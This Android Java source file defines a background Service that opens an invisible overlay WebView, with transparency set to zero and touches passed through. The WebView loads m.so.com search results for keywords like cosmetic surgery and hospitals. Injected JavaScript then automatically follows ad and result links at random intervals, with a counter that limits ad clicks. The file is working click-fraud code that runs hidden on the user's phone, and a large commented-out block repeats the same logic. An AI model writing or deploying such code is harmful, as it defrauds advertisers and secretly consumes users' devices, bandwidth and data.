package com.advertising.adevert;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.ArrayList;
import java.util.Random;

/**
 * Created by Administrator on 2017/10/12 0012.
 */

public class TestOneService extends Service {
//    private String Urlpass = "http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=";
//    final private String urlSearch = "//m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=";
//    private String urlDo="http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=";
//    private static String urlBoost = "http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=鲜花";
//    private String urlConneaction = "http://api.m.baidu.com/?type=hot&c=shishi&from=weibo";
//    private static String[] strArr = {"suv","鲜花","整容","唯品会","眼镜","整形医院","医院","电脑"};
//    private int maxnum = 3;
//    private Boolean connetNum = false;
////    public static int i = 0;
//    private int j = 0;
//    private int i = 0;
//    private int pcnum = 0;
//    private String pcStr = "advertise";
//    private static ArrayList list = new ArrayList();
//    private static ArrayList<String[]> advert;
    public TestOneService(View webView1) {
        super();
    }

    public TestOneService() {
    }
    
    public void run(){

    }


        private WindowManager wManager;// 窗口管理者
    private WindowManager.LayoutParams mParams;// 窗口的属性
    private MyView myView;
    private WebView webView1;
    private boolean flag = true;

    @Override
    public void onCreate() {
//        Log.i("Kathy","onCreate - Thread ID = " + Thread.currentThread().getId());
        System.out.println("sssssss");
        super.onCreate();

//        wManager = (WindowManager) getApplicationContext().getSystemService(
//                Context.WINDOW_SERVICE);
//        mParams = new WindowManager.LayoutParams();
//        mParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;// 系统提示window
//        mParams.format = PixelFormat.TRANSLUCENT;// 支持透明
//        //mParams.format = PixelFormat.RGBA_8888;
//        mParams.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;// 焦点
//        mParams.width = 490;//窗口的宽和高
//        mParams.height = 160;
//        mParams.x = 0;//窗口位置的偏移量
//        mParams.y = 0;
//        //mParams.alpha = 0.1f;//窗口的透明度


//        View view = LayoutInflater.from(getApplicationContext()).inflate(R.layout.advert,
//                null);
//        final WebView webView1 = (WebView) view.findViewById(R.id.webview1);
//        advert = new ArrayList<String[]>();
//        advert.add(strArr);
//        list.add(strArr);
//        webView1.getSettings().setJavaScriptEnabled(true);
//        webView1.getSettings().setDomStorageEnabled(true);
//        webView1.setWebViewClient(new WebViewClient());
//        webView1.loadUrl(urlBoost);
//        TestOneService mt2=new TestOneService(webView1);
//        mt2.run();

//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                System.out.println("Runnable run");
//            };
//        }).start();
//        webView1.addJavascriptInterface(new DemoInteface(), "myObj");
//        webView1.setWebViewClient(new WebViewClient() {
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, String url) {
//                System.out.println("android0~"+i);
//                String urlNow[] = url.split(":");
//                if(urlNow[1].substring(0,12).equals(urlSearch.substring(0,12))){
//                    i=1;
////                  if( pcnum != 2) {
////                      webView1.loadUrl("javascript:setValuesJson('advertise')");
////                  }else{
////                      webView1.loadUrl("javascript:setValuesJson('BBC')");
////                  }
//                    System.out.println("android1~"+url);
//                    return false;
//                }else{
//                    if(i==1){
//                        i=2;
//                        System.out.println("android2~"+url);
//                        return false;
//                    }else if(i == 2){
//                        i = 3;
//                        Urlpass = url;
//                        System.out.println("android3~"+url);
//                        return false;
//                    }else if(i==3){
//                        i=4;
//                        System.out.println("android4~"+url);
//                        return false;
//                    }else if(i==4){
//                        i = 5;
//                        System.out.println("android5~"+url);
//                        return false;
//                    }else if(i == 5){
//                        i=0;
//                        System.out.println("android6~"+url);
//                        Random random = new Random();
//                        pcnum = random.nextInt(5);
//                        if(pcnum != 2) {
//                            pcStr = "advertise";
//                            Random random2 = new Random();
//                            String[] imageUrls = advert.get(0);
//                            int numad = random.nextInt(imageUrls.length);
//                            Log.v("vivi","sssssssssadvert"+imageUrls[numad]);
//                            urlBoost = urlDo + imageUrls[numad];
//                        }else{
//                            pcStr = "BBC";
//                            Random random2 = new Random();
//                            int num = random2.nextInt(list.size());
//                            Log.v("vivi","sssssssssputong"+(String)list.get(num));
//                            urlBoost = urlDo+(String)list.get(num);
//                        }
//                        System.out.println("android6~"+urlBoost);
//                    }
//                    view.loadUrl(urlBoost);
//                    return true   ;
//                }
//            }
//            public void onPageStarted(WebView view, String url ,Bitmap favicon){
//                System.out.println("aaa~");
//                super.onPageStarted(view,url,favicon);
//            }
//
//            @Override
//            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
//                super.onReceivedError(view, errorCode, description, failingUrl);
//                view.loadUrl("http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=鲜花");
//            }
//
//
////            var bool = javascript:myObj.fromJs();console.log('aaa~~~'+bool);
//
//
//            @Override
//            public void onPageFinished(WebView view, String url) {
//                super.onPageFinished(view, url);
//                String  js = "var script = document.createElement('script');";
////                js +="var ppc ;";
//                js += " var bool = window.myObj.fromJs2();console.log('aaa~~~'+bool);";
////                js +="function setValuesJson(param){ppc = param;console.log('aaa~~~1'+ppc);}";
//                js +="var timer = 0;";
//                js +="var a = '//m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=';";
//                js +="var b = decodeURIComponent(document.URL);var c =b.split(':');";
//                js +="if(a.substring(0,11) == c[1].substring(0,11))" +
//                        "{ var numobj = Math.floor((Math.random()*5));" +
//                        "console.log('webview~触发数'+numobj);" +
//                        "console.log(bool);" +
//                        "if(bool != 'advertise'){setTimeout(function(){ document.location.href=document.getElementsByClassName('alink')[numobj].href;timer=Math.random()*7000+3000;},timer);" +
//                        "console.log('webview~普通'+document.getElementsByClassName('alink')[numobj].href);" +
//                        "}" +
//                        "else{javascript:myObj.fromJs();setTimeout(function() {document.location.href=document.getElementsByClassName('title')[0].href;timer=Math.random()*7000+3000;},timer);" +
//                        "console.log('webview~广告'+document.getElementsByClassName('title')[0].href);" +
//                        "}" +
//                        "}" +
//                        "else{" +
//                        "console.log('webview~点击后的页面链接'+String(document.URL ));" +
//                        "console.log('webview~点击a'+document.getElementsByTagName('a')[0]); " +
//                        "if(document.getElementsByTagName('a')[0] != 'undefined')" +
//                        "{var a = document.getElementsByTagName('a')[0].href;" +
//                        "if(a.substring(0,4)!='http'){a = String(document.URL );}" +
//                        "}else{var a = decodeURIComponent(document.URL); }" +
//                        "console.log('webview~a标签'+a);setTimeout(function() {document.location.href=a;},3000);" +
//                        "}";
//                webView1.loadUrl("javascript:"+js);
//            }
//        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("Kathy", "onStartCommand - startId = " + startId + ", Thread ID = " + Thread.currentThread().getId());
        System.out.println("sssssss");
        TestOneService.showPopupWindow(getApplicationContext());
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.i("Kathy", "onBind - Thread ID = " + Thread.currentThread().getId());
        return null;
    }

    @Override
    public void onDestroy() {
        Log.i("Kathy", "onDestroy - Thread ID = " + Thread.currentThread().getId());
        super.onDestroy();
    }


    private static final String LOG_TAG = "WindowUtils";
    private static View mView = null;
    private static WindowManager mWindowManager = null;
    private static Context mContext = null;
    public static Boolean isShown = false;
    private static String Urlpass = "http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=";
    static final private String urlSearch = "//m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=";
    private static String urlDo="http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=";
    private static String urlBoost = "http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=鲜花";
    private String urlConneaction = "http://api.m.baidu.com/?type=hot&c=shishi&from=weibo";
    private static String[] strArr = {"suv","鲜花","整容","唯品会","眼镜","整形医院","医院","电脑"};
    private static int maxnum = 3;
    private Boolean connetNum = false;
    //    public static int i = 0;
    private static int j = 0;
    private static int i = 0;
    private static int pcnum = 0;
    private static String pcStr = "advertise";
    private static ArrayList list = new ArrayList();
    private static ArrayList<String[]> advert;
    /**
     * 显示弹出框
     *
     * @param context
     */
    public static void showPopupWindow(final Context context) {


        if (isShown) {
            return;
        }
        isShown = true;
        // 获取应用的Context
        mContext = context.getApplicationContext();
        // 获取WindowManager
        mWindowManager = (WindowManager) mContext
                .getSystemService(Context.WINDOW_SERVICE);
        mView = setUpView(context);
        final WindowManager.LayoutParams params = new WindowManager.LayoutParams();
        // 类型
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        // WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
        // 设置flag
//        int flags =   WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM;
        int flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        // | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        // 如果设置了WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE，弹出的View收不到Back键的事件
        params.flags = flags;
        // 不设置这个弹出框的透明遮罩显示为黑色
//        params.format = PixelFormat.TRANSLUCENT;
        params.format = PixelFormat.RGBA_8888;
        // FLAG_NOT_TOUCH_MODAL不阻塞事件传递到后面的窗口
        // 设置 FLAG_NOT_FOCUSABLE 悬浮窗口较小时，后面的应用图标由不可长按变为可长按
        // 不设置这个flag的话，home页的划屏会有问题
//        params.width = WindowManager.LayoutParams.MATCH_PARENT;
//        params.height = WindowManager.LayoutParams.MATCH_PARENT;
//        params.gravity = Gravity.CENTER;


        // 设置悬浮框的宽高
        params.width = WindowManager.LayoutParams.MATCH_PARENT;
        params.height = 300;
        params.gravity = Gravity.LEFT;
        params.x = 200;
        params.y = 000;

        params.alpha = 0.0f;
        mWindowManager.addView(mView, params);
    }
    /**
     * 隐藏弹出框
     */
    public static void hidePopupWindow() {

        if (isShown && null != mView) {

            mWindowManager.removeView(mView);
            isShown = false;
        }
    }


//    android:background="#00000000"

    public static class DemoInteface {
        @android.webkit.JavascriptInterface
        public String fromJs() {
            j++;
            if(j > maxnum){
                urlDo = "about:blank;";
                return pcStr;
            }
//            Log.v("vivi","aaaaa"+connet);
//            if(connet.equals("1"))
//            {
//                connetNum = false;
//            }else if(connet.equals("2")){
//                connetNum = true;
//            }
            return pcStr;
        }

        @android.webkit.JavascriptInterface
        public String fromJs2(){
            Log.v("vivi","ssss"+pcStr);
            return pcStr;
        }
    }


    private static View setUpView(final Context context) {


        View view = LayoutInflater.from(context).inflate(R.layout.advert,
                null);




        final WebView webView1 = (WebView) view.findViewById(R.id.webview1);



        webView1.setOnTouchListener(new View.OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                return true;
            }
        });
        webView1.setBackgroundColor(0);
        advert = new ArrayList<String[]>();
        advert.add(strArr);
        list.add(strArr);
        webView1.getSettings().setJavaScriptEnabled(true);
        webView1.getSettings().setDomStorageEnabled(true);
        webView1.setWebViewClient(new WebViewClient());
        webView1.loadUrl(urlBoost);

        webView1.addJavascriptInterface(new DemoInteface(), "myObj");
        webView1.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                System.out.println("android0~"+i);
                String urlNow[] = url.split(":");
                if(urlNow[1].substring(0,12).equals(urlSearch.substring(0,12))){
                    i=1;
//                  if( pcnum != 2) {
//                      webView1.loadUrl("javascript:setValuesJson('advertise')");
//                  }else{
//                      webView1.loadUrl("javascript:setValuesJson('BBC')");
//                  }
                    System.out.println("android1~"+url);
                    return false;
                }else{
                    if(i==1){
                        i=2;
                        System.out.println("android2~"+url);
                        return false;
                    }else if(i == 2){
                        i = 3;
                        Urlpass = url;
                        System.out.println("android3~"+url);
                        return false;
                    }else if(i==3){
                        i=4;
                        System.out.println("android4~"+url);
                        return false;
                    }else if(i==4){
                        i = 5;
                        System.out.println("android5~"+url);
                        return false;
                    }else if(i == 5){
                        i=0;
                        System.out.println("android6~"+url);
                        Random random = new Random();
                        pcnum = random.nextInt(5);
                        if(pcnum != 2) {
                            pcStr = "advertise";
                            Random random2 = new Random();
                            String[] imageUrls = advert.get(0);
                            int numad = random.nextInt(imageUrls.length);
                            Log.v("vivi","sssssssssadvert"+imageUrls[numad]);
                            urlBoost = urlDo + imageUrls[numad];
                        }else{
                            pcStr = "BBC";
                            Random random2 = new Random();
                            int num = random2.nextInt(list.size());
                            Log.v("vivi","sssssssssputong"+(String)list.get(num));
                            urlBoost = urlDo+(String)list.get(num);
                        }
                        System.out.println("android6~"+urlBoost);
                    }
                    view.loadUrl(urlBoost);
                    return true   ;
                }
            }
            public void onPageStarted(WebView view, String url ,Bitmap favicon){
                System.out.println("aaa~");
                super.onPageStarted(view,url,favicon);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                view.loadUrl("http://m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=鲜花");
            }


//            var bool = javascript:myObj.fromJs();console.log('aaa~~~'+bool);


            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                String  js = "var script = document.createElement('script');";
//                js +="var ppc ;";
                js += " var bool = window.myObj.fromJs2();console.log('aaa~~~'+bool);";
//                js +="function setValuesJson(param){ppc = param;console.log('aaa~~~1'+ppc);}";
                js +="var timer = 0;";
                js +="var a = '//m.so.com/s?ie=utf-8&fr=none&src=360sou_newhome&q=';";
                js +="var b = decodeURIComponent(document.URL);var c =b.split(':');";
                js +="if(a.substring(0,11) == c[1].substring(0,11))" +
                        "{ var numobj = Math.floor((Math.random()*5));" +
                        "console.log('webview~触发数'+numobj);" +
                        "console.log(bool);" +
                        "if(bool != 'advertise'){setTimeout(function(){ document.location.href=document.getElementsByClassName('alink')[numobj].href;timer=Math.random()*7000+3000;},timer);" +
                        "console.log('webview~普通'+document.getElementsByClassName('alink')[numobj].href);" +
                        "}" +
                        "else{javascript:myObj.fromJs();setTimeout(function() {document.location.href=document.getElementsByClassName('title')[0].href;timer=Math.random()*7000+3000;},timer);" +
                        "console.log('webview~广告'+document.getElementsByClassName('title')[0].href);" +
                        "}" +
                        "}" +
                        "else{" +
                        "console.log('webview~点击后的页面链接'+String(document.URL ));" +
                        "console.log('webview~点击a'+document.getElementsByTagName('a')[0]); " +
                        "if(document.getElementsByTagName('a')[0] != 'undefined')" +
                        "{var a = document.getElementsByTagName('a')[0].href;" +
                        "if(a.substring(0,4)!='http'){a = String(document.URL );}" +
                        "}else{var a = decodeURIComponent(document.URL); }" +
                        "console.log('webview~a标签'+a);setTimeout(function() {document.location.href=a;},3000);" +
                        "}";
                webView1.loadUrl("javascript:"+js);
            }
        });




        return view;
    }




}
